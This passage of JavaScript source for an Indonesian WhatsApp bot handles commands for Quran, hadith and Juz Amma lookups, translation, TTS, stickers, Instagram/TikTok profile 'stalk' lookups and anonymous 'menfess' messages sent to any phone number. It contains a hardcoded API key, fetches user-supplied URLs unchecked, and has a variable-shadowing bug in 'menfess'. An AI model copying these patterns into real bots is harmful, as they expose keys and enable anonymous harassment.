"rowId": `juzdl https://fatiharridho.my.id/database/islam/juz-amma-arab-latin-indonesia.docx`
},
{
"title": `3. JuzAma`,
"description": `Format Powerpoint(pptx)`,
"rowId": `juzdl https://fatiharridho.my.id/database/islam/juz-amma-arab-latin-indonesia.pptx`
},
{
"title": `4. JuzAma`,
"description": `Format Excel(xlsx)`,
"rowId": `juzdl https://fatiharridho.my.id/database/islam/juz-amma-arab-latin-indonesia.xlsx}`
}
]}],
}
conn.sendMessage(m.chat, listjuzMessage, {quoted: m})
}
break



case 'juzdl':{
try {
if(text.includes("pdf")) {
conn.sendMessage(m.chat, {document: {url: 'https://fatiharridho.my.id/database/islam/juz-amma-arab-latin-indonesia.pdf'}, mimetype: 'application/pdf', fileName: 'juz-amma-arab-latin-indonesia.pdf'}, {quoted:m})
} else if (text.includes('docx')) {
conn.sendMessage(m.chat, {document: {url: 'https://fatiharridho.my.id/database/islam/juz-amma-arab-latin-indonesia.docx'}, mimetype: 'application/vnd.openxmlformats-officedocument.wordprocessingml.document', fileName: 'juz-amma-arab-latin-indonesia.docx'}, {quoted:m})
} else if (text.includes('pptx')) {
conn.sendMessage(m.chat, {document: {url: 'https://fatiharridho.my.id/database/islam/juz-amma-arab-latin-indonesia.pptx'}, mimetype: 'application/vnd.openxmlformats-officedocument.presentationml.presentation', fileName: 'juz-amma-arab-latin-indonesia.pptx'}, {quoted:m})
} else if (text.includes('xlsx')) {
conn.sendMessage(m.chat, {document: {url: 'https://fatiharridho.my.id/database/islam/juz-amma-arab-latin-indonesia.xlsx'}, mimetype: 'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet', fileName: 'juz-amma-arab-latin-indonesia.xlsx'}, {quoted:m})
}
} catch(err) {
m.reply(`Ulangi kembali\nTetap error? lapor owner`)
}
}break



case 'hadist':{
try {
if(!text.includes("/")) return m.reply(`*Cara penggunaan*
*Contoh :* ${prefix+command} muslim/1

Pilihan hadist yang tersedia:

*Hadist :* abu-daud
*Nomor :* 1-4590

*Hadist :* ahmad
*Nomor :* 1-26363

*Hadist :* bukhari
*Nomor :* 1-7008

*Hadist :* darimi
*Nomor :* 1-3367

*Hadist :* ibu-majah
*Nomor :* 1-4331

*Hadist :* nasai
*Nomor :* 1-5662

*Hadist :* malik
*Nomor :* 1-1594

*Hadist :* muslim
*Nomor :* 1-5362`)
hadisit = args.join(" ")
texthd1 = hadisit.split("/")[0]
texthd2 = hadisit.split("/")[1]

let ries = await fetchJson(`https://islamic-api-indonesia.herokuapp.com/api/data/json/hadith/${texthd1}`)
let { number, arab, id } = ries.find(v => v.number == texthd2)

m.reply(`*Hadist feature*

*Hadis:*
${arab}
_*Artinya:*_
_${id}_`)
} catch(err) {
m.reply(`Ulangi kembali\nTetap error? lapor owner`)
}
}

break



case 'iqra':{
let listiqraMessage = {
text: 'Silahkan pilih list iqra',
footer: `©Perwira Bot WhatsApp`,
title: `*Iqra Feature*`,
buttonText: "Click Here",
sections: [{
"title": `Hasil penelusuran yang ditemukan`,
"rows": [{
"title": `Iqra 1`,
"description": `Iqra 1 format pdf`,
"rowId": `iqrapdf https://islamic-api-indonesia.herokuapp.com/api/data/pdf/iqra1`
},
{
"title": `Iqra 2`,
"description": `Iqra 2 format pdf`,
"rowId": `iqrapdf https://islamic-api-indonesia.herokuapp.com/api/data/pdf/iqra2`
},
{
"title": `Iqra 3`,
"description": `Iqra 3 format pdf`,
"rowId": `iqrapdf https://islamic-api-indonesia.herokuapp.com/api/data/pdf/iqra3`
},{
"title": `Iqra 4`,
"description": `Iqra 4 format pdf`,
"rowId": `iqrapdf https://islamic-api-indonesia.herokuapp.com/api/data/pdf/iqra4`
},{
"title": `Iqra 5`,
"description": `Iqra 5 format pdf`,
"rowId": `iqrapdf https://islamic-api-indonesia.herokuapp.com/api/data/pdf/iqra5`
},{
"title": `Iqra 6`,
"description": `Iqra 6 format pdf`,
"rowId": `iqrapdf https://islamic-api-indonesia.herokuapp.com/api/data/pdf/iqra6`
}]}],
}

conn.sendMessage(m.chat, listiqraMessage, {quoted: m})
}
break



case 'iqrapdf':{
if(text.length < 1) return
try {
conn.sendMessage(m.chat, {document: {url: text}, mimetype: 'application/pdf', fileName: `${text.split("/")[6]}`}, {quoted: m})
} catch(err) {
m.reply(util.format(err))
}
}
break




case 'alquran':{
surah = q.split("/")[0]
let ayat = q.split("/")[1]

if(!text.includes("/")) return m.reply(`*Cara menggunakan*\n${prefix+command} urutan surat/ayat\n*Contoh :* ${prefix+command} 1/2\n\n
*List Surat dan Jumlah ayat*

*1.* *Al-Fatihah* || 7 ayat
*2.* *Al-Baqarah* || 286 ayat
*3.* *Ali 'Imran* || 200 ayat
*4.* *An-Nisa'* || 176 ayat
*5.* *Al-Ma'idah* || 120 ayat
*6.* *Al-An'am* || 165 ayat
*7.* *Al-A'raf* || 206 ayat
*8.* *Al-Anfal* || 75 ayat
*9.* *At-Taubah* || 129 ayat
*10.* *Yunus* || 109 ayat
*11.* *Hud* || 123 ayat
*12.* *Yusuf* || 111 ayat
*13.* *Ar-Ra'd* || 43 ayat
*14.* *Ibrahim* || 52 ayat
*15.* *Al-Hijr* || 99 ayat
*16.* *An-Nahl* || 128 ayat
*17.* *Al-Isra'* || 111 ayat
*18.* *Al-Kahf* || 110 ayat
*19.* *Maryam* || 98 ayat
*20.* *Taha* || 135 ayat
*21.* *Al-Anbiya'* || 112 ayat
*22.* *Al-Hajj* || 78 ayat
*23.* *Al-Mu'minun* || 118 ayat
*24.* *An-Nur* || 64 ayat
*25.* *Al-Furqan* || 77 ayat
*26.* *Asy-Syu'ara'* || 227 ayat
*27.* *An-Naml* || 93 ayat
*28.* *Al-Qasas* || 88 ayat
*29.* *Al-'Ankabut* || 69 ayat
*30.* *Ar-Rum* || 60 ayat
*31.* *Luqman* || 34 ayat
*32.* *As-Sajdah* || 30 ayat
*33.* *Al-Ahzab* || 73 ayat
*34.* *Saba'* || 54 ayat
*35.* *Fatir* || 45 ayat
*36.* *Yasin* || 83 ayat
*37.* *As-Saffat* || 182 ayat
*38.* *Sad* || 88 ayat
*39.* *Az-Zumar* || 75 ayat
*40.* *Gafir* || 85 ayat
*41.* *Fussilat* || 54 ayat
*42.* *Asy-Syura* || 53 ayat
*43.* *Az-Zukhruf* || 89 ayat
*44.* *Ad-Dukhan* || 59 ayat
*45.* *Al-Jasiyah* || 37 ayat
*46.* *Al-Ahqaf* || 35 ayat
*47.* *Muhammad* || 38 ayat
*48.* *Al-Fath* || 29 ayat
*49.* *Al-Hujurat* || 18 ayat
*50.* *Qaf* || 45 ayat
*51.* *Az-Zariyat* || 60 ayat
*52.* *At-Tur* || 49 ayat
*53.* *An-Najm* || 62 ayat
*54.* *Al-Qamar* || 55 ayat
*55.* *Ar-Rahman* || 78 ayat
*56.* *Al-Waqi'ah* || 96 ayat
*57.* *Al-Hadid* || 29 ayat
*58.* *Al-Mujadalah* || 22 ayat
*59.* *Al-Hasyr* || 24 ayat
*60.* *Al-Mumtahanah* || 13 ayat
*61.* *As-Saff* || 14 ayat
*62.* *Al-Jumu'ah* || 11 ayat
*63.* *Al-Munafiqun* || 11 ayat
*64.* *At-Tagabun* || 18 ayat
*65.* *At-Talaq* || 12 ayat
*66.* *At-Tahrim* || 12 ayat
*67.* *Al-Mulk* || 30 ayat
*68.* *Al-Qalam* || 52 ayat
*69.* *Al-Haqqah* || 52 ayat
*70.* *Al-Ma'arij* || 44 ayat
*71.* *Nuh* || 28 ayat
*72.* *Al-Jinn* || 28 ayat
*73.* *Al-Muzzammil* || 20 ayat
*74.* *Al-Muddassir* || 56 ayat
*75.* *Al-Qiyamah* || 40 ayat
*76.* *Al-Insan* || 31 ayat
*77.* *Al-Mursalat* || 50 ayat
*78.* *An-Naba'* || 40 ayat
*79.* *An-Nazi'at* || 46 ayat
*80.* *'Abasa* || 42 ayat
*81.* *At-Takwir* || 29 ayat
*82.* *Al-Infitar* || 19 ayat
*83.* *Al-Mutaffifin* || 36 ayat
*84.* *Al-Insyiqaq* || 25 ayat
*85.* *Al-Buruj* || 22 ayat
*86.* *At-Tariq* || 17 ayat
*87.* *Al-A'la* || 19 ayat
*88.* *Al-Gasyiyah* || 26 ayat
*89.* *Al-Fajr* || 30 ayat
*90.* *Al-Balad* || 20 ayat
*91.* *Asy-Syams* || 15 ayat
*92.* *Al-Lail* || 21 ayat
*93.* *Ad-Duha* || 11 ayat
*94.* *Asy-Syarh* || 8 ayat
*95.* *At-Tin* || 8 ayat
*96.* *Al-'Alaq* || 19 ayat
*97.* *Al-Qadr* || 5 ayat
*98.* *Al-Bayyinah* || 8 ayat
*99.* *Az-Zalzalah* || 8 ayat
*100.* *Al-'Adiyat* || 11 ayat
*101.* *Al-Qari'ah* || 11 ayat
*102.* *At-Takasur* || 8 ayat
*103.* *Al-'Asr* || 3 ayat
*104.* *Al-Humazah* || 9 ayat
*105.* *Al-Fil* || 5 ayat
*106.* *Quraisy* || 4 ayat
*107.* *Al-Ma'un* || 7 ayat
*108.* *Al-Kausar* || 3 ayat
*109.* *Al-Kafirun* || 6 ayat
*110.* *An-Nasr* || 3 ayat
*111.* *Al-Lahab* || 5 ayat
*112.* *Al-Ikhlas* || 4 ayat
*113.* *Al-Falaq* || 5 ayat
*114.* *An-Nas* || 6 ayat`)
axios(`https://api.quran.sutanlab.id/surah/${surah}/${ayat}`).then(({data}) => {
try {
anau = `*Alquran Feature*

*Surah :* ${data.data.surah.name.short}(${data.data.surah.name.transliteration.id})
*Artinya :* ${data.data.surah.name.translation.id}
*Wahyu :* ${data.data.surah.revelation.arab}(${data.data.surah.revelation.id})

${data.data.text.arab}
_*Artinya:*_ _${data.data.translation.id}_

*Tentang surah*
${data.data.surah.tafsir.id}
`
let btna = [{
quickReplyButton: {
displayText: 'Singkat',
id: `textshort ${text}`
}
}, {
quickReplyButton: {
displayText: 'Panjang',
id: `textlong ${text}`
}
}, {
quickReplyButton: {
displayText: 'Audio',
id: `baca ${text}`
}
}]
conn.sendButtonText2(m.chat, anau, `Opsi pilihan penjelasan`, btna)
} catch(err) {
m.reply(`*Ulangi kembali*\nTetap error? Lapor owner\n\n${util.format(err)}`)
}
})


}
break




case 'textlong': {
surah = q.split("/")[0]
ayat = q.split("/")[1]
try {
if(!text.includes("/")) return
let resa = await fetchJson(`https://api.quran.sutanlab.id/surah/${surah}/${ayat}`)
let penjelasanp = resa.data.tafsir.id.long
let anuo = `*Alquran*

*Penjelasan secara panjang*
${penjelasanp}
`
m.reply(anuo)
} catch(err) {
m.reply(util.format(err))
}
}
break



case 'textshort': {
surah = q.split("/")[0]
ayat = q.split("/")[1]
try {
if(!text.includes("/")) return
let resai = await fetchJson(`https://api.quran.sutanlab.id/surah/${surah}/${ayat}`)
let penjelasans = resai.data.tafsir.id.short
let anuoi = `*Alquran*

*Penjelasan secara singkat*
${penjelasans}
`
m.reply(anuoi)
} catch(err) {
m.reply(util.format(err))
}
}
break



case 'baca':{
surah = q.split("/")[0]
ayat = q.split("/")[1]
try {
if(!text.includes("/")) return
let aad = await fetchJson(`https://api.quran.sutanlab.id/surah/${surah}/${ayat}`)
let audiio = aad.data.audio.primary
conn.sendMessage(m.chat,{audio: {url: audiio}, mimetype: 'audio/mpeg'}, {quoted: m})
} catch(err) {
m.reply(util.format(err))
}
}
break




case 'tts': {

let kuyin = args.join(" ")
if (args.length < 1) return m.reply(`Masukkan kode bahasa dan teks\n*Contoh :* ${prefix+command} id/Halo`)
try {
if (kuyin.includes("/")) {
let kun = args.join(" ")
let kunik = kun.split("/")[0]
let kunil = kun.split("/")[1]
const gtts = require('./lib/gtts')(kunik)
let ranm = getRandom('.mp3')
let rano = getRandom('.ogg')
gtts.save(ranm, kunil, function() {
exec(`ffmpeg -i ${ranm} -ar 48000 -vn -c:a libopus ${rano}`, (err) => {
fs.unlinkSync(ranm)
let buff = fs.readFileSync(rano)
if (err) return m.reply('Error :(')
conn.sendMessage(m.chat, {audio: buff, ptt: true}, {quoted: m})
fs.unlinkSync(rano)
})
})
} else {
m.reply(`Masukkan kode bahasa dan teks\n*Contoh :* ${prefix+command} id/Halo`)
}
} catch (e) {
m.reply("Error")
}
} break



case 'ttp': {
if(text.length < 1) return m.reply(`Cara menggunakan\n*Contoh :* ${prefix+command} Perwira`)
await conn.sendImageAsSticker(m.chat, `https://api.xteam.xyz/ttp?file&text=${encodeURI(text)}`, m, {packname: 'Sticker', author: 'Perwira Bot WhatsApp'})
}
break



case 'attp':
{
try {
if(text.length < 1) return m.reply(`Contoh: ${prefix+command} Halo`)
let stik = await getBuffer(`https://api.xteam.xyz/attp?file&text=${encodeURI(text)}`)
conn.sendMessage(m.chat, {sticker: stik, mimetype: 'image/webp'}, {quoted: m})
} catch(e) {
m.reply(util.format(e))
}
}
break



case 'public': {
if (!isCreator) return m.reply(mess.owner)
conn.public = true
m.reply('Sukse Change To Public Usage')
}
break

case 'self': {
if (!isCreator) return m.reply(mess.owner)
conn.public = false
m.reply('Sukses Change To Self Usage')
}
break

case 'translate':
case 'tr':{
try {
if (text.includes("/")) {
if(m.quoted) return conn.sendButtonText(m.chat, [{buttonId: 'kodebahasa', buttonText: {displayText: 'Kode Bahasa'}, type:1}], `*Contoh :*\n${prefix+command} id/Thanks\nAtau\n${prefix+command} id(reply pesan)`, `©Perwira Bot WhatsApp`, m)
let texti = args.join(" ")
let text2 = texti.split("/")[0]
let text1 = texti.split("/")[1]

let tr = require("translate-google-api")
let _tr = await tr(`${text1}`, {to: text2})
m.reply(_tr[0])
} else if(m.quoted) {
if(text.includes("/")) return conn.sendButtonText(m.chat, [{buttonId: 'kodebahasa', buttonText: {displayText: 'Kode Bahasa'}, type:1}], `*Contoh :*\n${prefix+command} id/Thanks\nAtau\n${prefix+command} id(reply pesan)`, `©Perwira Bot WhatsApp`, m)
if (/image/.test(mime)) return
if (/audio/.test(mime)) return
if (/video/.test(mime)) return
if (/webp/.test(mime)) return

let texti = args.join(" ")
let text2 = texti
let text1 = m.quoted.text

let tr = require("translate-google-api")
let _tr = await tr(`${text1}`, {to: text2})
m.reply(_tr[0])
} else {
conn.sendButtonText(m.chat, [{buttonId: 'kodebahasa', buttonText: {displayText: 'Kode Bahasa'}, type:1}], `*Contoh :*\n${prefix+command} id/Thanks\nAtau\n${prefix+command} id(reply pesan)`, `©Perwira Bot WhatsApp`, m)
}
} catch(e) {
m.reply(util.format(e))
}
}
break



case 'kodebahasa':{
let leang = `*Kode Bahasa*

Afrikaans = af
Albanian = sq
Amharic = am
Arabic = ar
Armenian = hy
Azerbaijani = az
Basque = eu
Belarusian = be
Bengali = bn
Bosnian = bs
Bulgarian = bg
Catalan = ca
Cebuano = ceb
Chichewa = ny
Chinese Simplified = zh-cn
Chinese Traditional = zh-tw
Corsican = co
Croatian = hr
Czech = cs
Danish = da
Dutch = nl
English = en
Esperanto = eo
Estonian = et
Filipino = tl
Finnish = fi
French = fr
Frisian = fy
Galician = gl
Georgian = ka
German = de
Greek = el
Gujarati = gu
Haitian Creole = ht
Hausa = ha
Hawaiian = haw
Hebrew = iw
Hindi = hi
Hmong = hmn
Hungarian = hu
Icelandic = is
Igbo = ig
Indonesian = id
Irish = ga
Italian = it
Japanese = ja
Javanese = jw
Kannada = kn
Kazakh = kk
Khmer = km
Korean = ko
Kurdish (Kurmanji) = ku
Kyrgyz = ky
Lao = lo
Latin = la
Latvian = lv
Lithuanian = lt
Luxembourgish = lb
Macedonian = mk
Malagasy = mg
Malay = ms
Malayalam = ml
Maltese = mt
Maori = mi
Marathi = mr
Mongolian = mn
Myanmar (Burmese) = my
Nepali = ne
Norwegian = no
Pashto = ps
Persian = fa
Polish = pl
Portuguese = pt
Punjabi = ma
Romanian = ro
Russian = ru
Samoan = sm
Scots Gaelic = gd
Serbian = sr
Sesotho = st
Shona = sn
Sindhi = sd
Sinhala = si
Slovak = sk
Slovenian = sl
Somali = so
Spanish = es
Sundanese = su
Swahili = sw
Swedish = sv
Tajik = tg
Tamil = ta
Telugu = te
Thai = th
Turkish = tr
Ukrainian = uk
Urdu = ur
Uyghur = ug
Uzbek = uz
Vietnamese = vi
Welsh = cy
Xhosa = xh
Yiddish = yi
Yoruba = yo
Zulu = zu`
m.reply(leang)
}
break



case 'ping': case 'botstatus': case 'statusbot': {
let used = process.memoryUsage()
let npmv = process.versions
let cpus = os.cpus().map(cpu => {
cpu.total = Object.keys(cpu.times).reduce((last, type) => last + cpu.times[type], 0)
return cpu
})
cpu = cpus.reduce((last, cpu, _, { length }) => {
last.total += cpu.total
last.speed += cpu.speed / length
last.times.user += cpu.times.user
last.times.nice += cpu.times.nice
last.times.sys += cpu.times.sys
last.times.idle += cpu.times.idle
last.times.irq += cpu.times.irq
return last
}, {
speed: 0,
total: 0,
times: {
user: 0,
nice: 0,
sys: 0,
idle: 0,
irq: 0
}
})
let timestamp = speed()
let latensi = speed() - timestamp
let neww = performance.now()
let oldd = performance.now()
let respon = `*Info Bot*
Last update on 24, Mei

*Thanks to*
*DikaArdnt* (Base bot)
*CAF ID* (Contributor)
*Mr_Dark* (Python script)
*Perwira* (Recode and fix bug)


*Base Bot:*
https://github.com/DikaArdnt/Hisoka-Morou

*Speed* ${latensi.toFixed(4)} second
*Runtime* : ${runtime(process.uptime())}

*Info Server*
RAM: ${formatp(os.totalmem() - os.freemem())} / ${formatp(os.totalmem())}

*NodeJS Memory Usaage*
${Object.keys(used).map((key, _, arr) => `${key.padEnd(Math.max(...arr.map(v=>v.length)),' ')}: ${formatp(used[key])}`).join('\n')}

*Info Version*
\`\`\`${Object.keys(npmv).map((key, _, arr) => `${key.padEnd(Math.max(...arr.map(v=>v.length)),' ')}: ${(npmv[key])}`).join('\n')}\`\`\`

${cpus[0] ? `*Total CPU Usage*
\`\`\`${cpus[0].model.trim()} (${cpu.speed} MHZ)\n${Object.keys(cpu.times).map(type => `- ${(type + '').padEnd(6)}: ${(100 * cpu.times[type] / cpu.total).toFixed(2)}%`).join('\n')}
_CPU Core(s) Usage (${cpus.length} Core CPU)_
${cpus.map((cpu, i) => `${i + 1}. ${cpu.model.trim()} (${cpu.speed} MHZ)\n${Object.keys(cpu.times).map(type => `- ${(type + '').padEnd(6)}: ${(100 * cpu.times[type] / cpu.total).toFixed(2)}%`).join('\n')}`).join('\n\n')}` : ''}
\`\`\``.trim()

var template = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
extendedTextMessage: {
text: respon, contextInfo: {externalAdReply: {title: 'My Channel YouTube', body: 'Subscribe untuk support owner', renderLargerThumbnail: true, mediaType: 1, mediaUrl: 'https://www.youtube.com/c/Per1440', sourceUrl: 'https://www.youtube.com/c/Per1440', thumbnail: fs.readFileSync('./image/phot.jpg')}}
},
}), {});conn.relayMessage(m.chat, template.message, { messageId: template.key.id })

/*conn.sendMessage(m.chat, {text: respon}, {quoted: m})*/

}
break



case 'nulis':{
try {
if(text.length < 1) return m.reply(`Masukkan teksnya\nContoh: ${prefix}${command} Perwira`)
let nulli = await getBuffer(`https://hadi-api.herokuapp.com/api/canvas/nulis?text=${encodeURI(q)}`)
await conn.sendMessage(m.chat, {image: nulli, mimetype: 'image/jpeg', caption: 'Done'}, {quoted: m}).catch((e) => m.reply(String(e)))
} catch(e) {
m.reply(`${String(e)}`)
}
}break


case 'tahta':
try {
if(text.length < 1) return m.reply(`Masukkan teksnya\nContoh: ${prefix}${command} Perwira`)
let gimgt = await getBuffer(`https://api.zeks.me/api/hartatahta?apikey=PerwiraGans&text=${q}`)
await conn.sendMessage(m.chat, {image: gimgt, mimetype: 'image/jpeg', caption: "_Sudah jadi kak_"}, {quoted: m}).catch((e) => m.reply(`*Error*\n${String(e)}`))
} catch(e) {
m.reply(`${util.format(e)}`)
}
break



case 'owner': case 'creator': {
tio = `Berikut adalah tag owner dari bot ini
@6282230819722 (Owner utama)
@6283167714830 (Owner kedua)`
conn.sendMessage(m.chat, {contacts: {displayName: '1',contacts:[{
"displayName": "Perwira Kusuma (Owner)",
"vcard": "BEGIN:VCARD\nVERSION:3.0\nN:;Perwira Kusuma (Owner);;;\nFN:Perwira Kusuma (Owner)\nitem1.TEL;waid=6282230819722:+62 822-3081-9722\nitem1.X-ABLabel:Ponsel\nX-WA-BIZ-DESCRIPTION:Owner P-Bot ✅\nX-WA-BIZ-NAME:Perwira Kusuma (Owner)\nEND:VCARD",
"contextInfo": {
externalAdReply:{title: 'Per144 (Subscribe Now)', body: 'Support me on YouTube - Click here',sourceUrl: 'https://youtube.com/channel/UCiA1c3DgEqjfCm5t6UwQ37w', mediaType: 1, mediaUrl: 'https://www.youtube.com/c/Per1440', renderLargerThumbnail: true, showAdAttribution: true, thumbnail: fs.readFileSync('./image/phot.jpg')}
}
}]
}
})
}
break



case 'mantap': {
m.reply("*Mantap, jangan melanggar rules!*")
}
break



break



case 'rules': {
let butts = [
{ buttonId: 'mantap', buttonText: { displayText: 'Saya mengerti' }, type: 1 }
]
butp = `*Thanks to* :
Dika ardiant (Base.bot)
Perwira (Owner)
Arul (Kontributor)
Mr_Dark(Python Script)
Sauma(Friend)

*Note!*
Dilarang spam (blokir otomatis)
Dilarang telfon (blokir otomatis)
Kata² toxic akan diubah otomatis

*Definition of this Bot*
Ini adalah simpel bot di WhatsApp yang dapat mempermudah untuk mendownload, membuat sticker ataupun convert beberapa pesan.

*Join Group Owner*
Untuk info terbaru dari bot 
https://chat.whatsapp.com/IeiqIJ8wYxiFJp4lVOyXQG
`

var template = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
extendedTextMessage: {
text: butp, contextInfo: {externalAdReply: {title: 'My Channel YouTube', body: 'Subscribe untuk support owner', renderLargerThumbnail: true, sourceUrl: 'https://www.youtube.com/c/Per1440',mediaType: 1, mediaUrl: 'https://www.youtube.com/c/Per1440', thumbnail: fs.readFileSync('./image/phot.jpg')}}
},
}), {});conn.relayMessage(m.chat, template.message, { messageId: template.key.id })

/*await conn.sendButLocc(m.chat, butts, butp, '©P-Bot 2022\nThis is simple Bot WhatsApp', fs.readFileSync('./image/g.jpg'))*/
} break



case 'igstalk':
case 'stalkig': {
if(text.length < 1) return m.reply(`Masukkan username instagram yang tepat\n*Contoh :* ${prefix+command} perwira_kusuma1`)
if(text.includes(`https://`)) return m.reply(`Masukkan username instagram yang tepat\n*Contoh :* ${prefix+command} perwira_kusuma1`)
try {
let { igstalk } = require("./lib/stalk.js")
let prof = ''
let prif = ''
let preif = ''
let datast = await igstalk(text)
let datastalke = `*Profile user*
━━━━━━━━━━
*${datast.full_name}*
${datast.username}
${datast.edge_followed_by.count} Followers
${datast.edge_follow.count} Following
${datast.edge_owner_to_timeline_media.count} Post

*Description*
${datast.biography}

*Url Link*
${datast.external_url}

*Account info*
━━━━━━━━━━
Professional: ${datast.is_professional_account}
Business: ${datast.is_business_account}
Private: ${datast.is_private}
Verivied: ${datast.is_verified}

*Profile picture*
_${datast.profile_pic_url_hd}_
`
let imgsr = await getBuffer(datast.profile_pic_url_hd)
conn.linkUp(m.chat, `${datastalke}`, `https://www.instagram.com/${text}`, imgsr, "Instagram Stalk", "Instagram Stalk By Bot WhatsApp")
/*conn.sendMessage(m.chat, {text: datastalke}, {quoted: m})*/
} catch(err) {
m.reply(String(err))
}
}
 break

case 'tiktokstalk':
case 'ttstalk': {
if(text.length < 1) return m.reply(`Masukkan username tiktok\n*Contoh:* ${prefix+command} per1440`)
let { stalk } = require('./lib/ttstalk')
let kuun = await stalk(text)

let texttt = `*Profile User*
━━━━━━━━━━
${kuun.name}
${kuun.username}
${kuun.videos}
${kuun.followers}
${kuun.following}
${kuun.like}
${kuun.desc}
`

let hyn = await getBuffer(kuun.profile)
conn.linkUp(m.chat, `${texttt}`, `https://tiktok2k.com/users/${text}`, hyn, "Tiktok Stalk", "Tiktok Stalk By Bot WhatsApp")
}
break

case 'reply': {
	m.reply(text)
	}
	break

case 'menu': 
case 'list': 
case 'help': {

let buttonis = [
{ buttonId: 'owner', buttonText: { displayText: 'Owner' }, type: 1 },
{ buttonId: 'rules', buttonText: { displayText: 'Rules' }, type: 1 }
]

let ubtn = [{
urlButton: {
displayText: 'Channel',
url: 'https://youtube.com/channel/UCiA1c3DgEqjfCm5t6UwQ37w'
}
}, {
urlButton: {
displayText: 'Instagram',
url: 'https://instagram.com/perwira_kusuma1'
}
}, {
quickReplyButton: {
displayText: 'Owner',
id: 'owner'
}
},
{
quickReplyButton: {
displayText: 'Info Bot',
id: 'info'
}
}]

let annon = `*Stiker Menu*
≻ ${prefix}ttp
≻ ${prefix}attp
≻ ${prefix}sticker
≻ ${prefix}triggered
≻ ${prefix}removebg

*Convert Menu*
≻ ${prefix}tts
≻ ${prefix}tourl
≻ ${prefix}togif
≻ ${prefix}totext
≻ ${prefix}toimg
≻ ${prefix}tomp3
≻ ${prefix}tomp4
≻ ${prefix}translate 

*Search Menu*
≻ ${prefix}play
≻ ${prefix}ttstalk
≻ ${prefix}igstalk
≻ ${prefix}igstory
≻ ${prefix}ringtone
≻ ${prefix}ytsearch
≻ ${prefix}wikihow
≻ ${prefix}wikipedia 
> ${prefix}apksearch

*Download Menu*
≻ ${prefix}ttdl
≻ ${prefix}igdl
≻ ${prefix}fbdl
> ${prefix}ttmp3
≻ ${prefix}ytmp3
≻ ${prefix}ytmp4
≻ ${prefix}igmulti
> ${prefix}pinterest
≻ ${prefix}mediafire

*Message Menu*
≻ ${prefix}menfess

*Maker Menu*
≻ ${prefix}anim
≻ ${prefix}textpro
≻ ${prefix}template
≻ ${prefix}styletext
`

let cn = `
*Stiker Menu* | *Convert Menu*
≻ ${prefix}ttp |≻ ${prefix}togif
≻ ${prefix}attp |≻ ${prefix}toimg
≻ ${prefix}sticker|≻ ${prefix}tomp3
≻ ${prefix}triggered|≻ ${prefix}tomp4
`
if(require("@adiwajshing/baileys").getDevice(quoted.id) === "android") {
templateButtones = [ {index: 1, callButton: {displayText: 'Phone', phoneNumber: '6282230819722'}}, {index: 2, urlButton: {displayText: 'WhatsApp Group', url: 'https://chat.whatsapp.com/IeiqIJ8wYxiFJp4lVOyXQG'}}, {index: 3, quickReplyButton: {displayText: 'Rules', id: 'rules'}},{index: 5, quickReplyButton: {displayText: 'Owner', id: 'owner'}},{index: 5, quickReplyButton: {displayText: 'Network', id: 'ping'}}]
templateMessages = {viewOnceMessage :{message : { templateMessage : {hydratedTemplate: { hydratedContentText: annon,
hydratedFooterText: "©P-Bot 2022 Android\nThis is Simple Bot WhatsApp", hydratedButtons: templateButtones}}}}}
conn.relayMessage(m.chat, templateMessages, {})
} else {
await conn.sendButGamc(m.chat, buttonis, annon, '©P-Bot 2022 iPhone\nThis is simple Bot WhatsApp', './image/io.jpg')
}

/*await conn.sendButtonText(m.chat, buttonis, annon, '©P-Bot 2022\nThis is simple Bot WhatsApp')*/
/*await conn.sendButGamc(m.chat, buttonis, annon, '©P-Bot 2022\nThis is simple Bot WhatsApp', './image/io.jpg')*/
/*await conn.sendButDioc(m.chat, buttonis, annon, '©P-Bot 2022\nThis is simple Bot WhatsApp', './image/kyu.jpg')*/
/*await conn.sendButLocc(m.chat, buttonis, annon, '©P-Bot 2022\nThis is simple Bot WhatsApp', fs.readFileSync('./image/ppj.jpg'))*/

/*conn.sendMessage(m.chat, {image: { url: './image/p.png'}, jpegThumbnail: fs.readFileSync('./image/r.png'), caption: annon,gifPlayback: false,fileLength: 10000000000000000, contextInfo: { externalAdReply: { body: 'Downloader, Stiker maker, and converter', mediaUrl: 'https://wa.me/qr/KFAP5CE6BZ24F1',
renderLargerThumbnail: true, mediaType: 1, thumbnail: fs.readFileSync('./image/nam.jpg')}}})*/
/*conn.sendButtonText2(m.chat, annon, '©Perwira Bot WhatsApp\nThis is simple Bot WhatsApp', ubtn)*/
/*conn.sendMessage(m.chat, {text: annon, mentions: ['6282230819722@s.whatsapp.net']})*/
}
break


case 'menfess': {
try {
let ret = `Fitur untuk mengirim pesan kepada nomor tujuan

*Cara menggunakan:*
${prefix}menfess 62xxxx/inisial/pesan

*Contoh:*
${prefix}menfess 62xxxx/Si kecil/Halo aku suka sama kamu`

if(m.isGroup) return m.reply("Tidak bisa digunakan didalam grup")
if(text.length < 1) return m.reply(ret)

let texot = ""
let texiot = text.split("/")[0].replace(/[^0-9]/g, "")
if(texiot.startsWith("0")) {
texot = `62${texiot.slice(1)}`
} else {
let texot = text.split("/")[0].replace(/[^0-9]/g, "")
}
let texit = text.split("/")[2]
let nm = text.split("/")[1]

if(nm === undefined) return m.reply(ret + "\n\n*Note*\nAnda belum memasukkan nama samaran\n\n*Perhatikan contoh!!!*")
if(nm.length < 1) return m.reply(ret + "\n\n*Note*\Isi nama inisial anda\n\n*Perhatikan contoh!!!*")
if(texit === undefined) return m.reply(ret + "\n\n*Note*\nAnda belum memasukkan pesan\n\n*Perhatikan contoh!!!*")
if(texit.length < 1) return m.reply(ret + "\n\n*Note*\nAnda belum memasukkan pesan\n\n*Perhatikan contoh!!!*")
let bi = ` *[ Menfess Chat ]* 
_______________________

From: ${nm}
Pesan: ${texit}
_______________________`

let bunis = [
{ buttonId: `see ${quoted.sender}`, buttonText: { displayText: 'Telah dibaca' }, type: 1 }
]
await conn.sendButtonMenf(`${texot}@s.whatsapp.net`, quoted.sender, bunis, bi, '©P-Bot 2022\nThis is simple Bot WhatsApp\nBalas pesan ini kepada pengirim dengan reply pesan dan command /balas isi pesan')
} catch(err) {
m.reply("Error" + String(err))
}
m.reply("Terkirim")
/*conn.sendMessage(`${texot}@s.whatsapp.net`, {text: bi}).catch(err => { m.reply(String(err)) })*/
}
break






case 'balas': {
if(m.isGroup) return m.reply("Tidak bisa digunakan didalam grup")
if(!m.quoted) return m.reply("Reply pesan Menfessnya")
if(!quoted.text.includes("[")) return m.reply("Bukan pesan Menfess")
